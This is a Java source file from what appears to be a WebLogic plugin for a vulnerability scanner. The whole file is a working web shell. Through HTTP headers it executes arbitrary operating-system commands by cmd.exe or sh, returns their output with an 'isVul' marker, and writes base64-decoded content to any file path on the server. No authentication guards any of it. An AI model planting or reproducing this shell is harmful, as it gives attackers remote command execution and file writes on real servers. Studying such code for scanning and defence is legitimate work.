package com.gbw.scanner.plugins.scripts.weblogic.shell;

import sun.misc.BASE64Decoder;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.URLDecoder;

public class GBWHttpShell {

    public GBWHttpShell(HttpServletRequest req, HttpServletResponse res) {
        try{
            String type=req.getHeader("type");
            if(type==null||type.equals("exec")){//执行命令
                String cmd=req.getHeader("cmd");
                if(cmd==null){
                    cmd="whoami";
                }
                res.setHeader("isVul","ok");
                String result=exec(cmd);
                res.getWriter().write(result);
            }else if(type.equals("upload")){//上传文件
                String path=req.getHeader("path");
                String text=req.getHeader("text");
                upload(path,text);
            }
        }catch (Exception e){
            e.printStackTrace();
        }

    }
    //上传文件
    public static void upload(String path, String text){
        try {
            FileOutputStream fileOutputStream = new FileOutputStream(path);
            fileOutputStream.write(new BASE64Decoder().decodeBuffer(URLDecoder.decode(text,"utf-8")));
            fileOutputStream.flush();
            fileOutputStream.close();
        }catch (Exception e) {

        }
    }
    //执行命令
    public static String exec(String cmd){
        try{
            String name= System.getProperty("os.name");
            String[] cmds =name!=null&&name.toLowerCase().contains("win") ? new String[]{"cmd.exe", "/c",  cmd}:new String[]{"sh", "-c", cmd};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            byte[] buf=new byte[1024];
            int len=0;
            ByteArrayOutputStream out=new ByteArrayOutputStream();
            while ((len=in.read(buf))!=-1){
                out.write(buf,0,len);
            }
            return new String(out.toByteArray());
        }catch (Exception e){

        }
        return null;
    }
}
